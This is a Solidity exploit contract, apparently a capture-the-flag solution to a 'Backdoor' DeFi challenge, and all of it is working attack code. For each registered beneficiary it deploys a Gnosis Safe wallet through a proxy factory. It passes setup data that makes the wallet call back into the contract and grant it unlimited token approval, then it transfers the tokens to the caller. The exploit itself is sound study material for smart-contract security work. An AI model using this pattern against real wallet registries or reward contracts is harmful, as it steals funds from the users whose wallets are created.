pragma solidity ^0.8.0;

interface IProxyCreationCallback {
    function proxyCreated(
        GnosisSafeProxy proxy,
        address _singleton,
        bytes calldata initializer,
        uint256 saltNonce
    ) external;
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface GnosisSafeProxy {
    function setup(address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface IProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract BackdoorAttacker {
    IToken private dvt;
    IProxyFactory private factory;
    address private attacker;
    address[] private users;
    address private masterCopy;
    address private registry;
    uint256 constant GET_NUMBER = 10 ether;

    constructor(address factoryAddress, address tokenAddress,address masterCopyAddress,address registryAddress, address[] memory usersAddress) {
        dvt = IToken(tokenAddress);
        factory = IProxyFactory(factoryAddress);
        masterCopy = masterCopyAddress;
        registry = registryAddress;
        users = usersAddress;
    }

    function approve(address spender, address tokenAddress) external {
        IToken(tokenAddress).approve(spender, type(uint256).max);
    }

    function attack() external {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory owner = new address[](1);
            owner[0] = user;
            bytes memory approveData = abi.encodeWithSignature("approve(address,address)", address(this), address(dvt));
            bytes memory setupData = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",owner,1,address(this),approveData,address(0),address(0),0,address(0));
            GnosisSafeProxy proxy = factory.createProxyWithCallback(masterCopy,setupData,0,IProxyCreationCallback(registry));
            dvt.transferFrom(address(proxy),msg.sender,GET_NUMBER);
        }
    }

}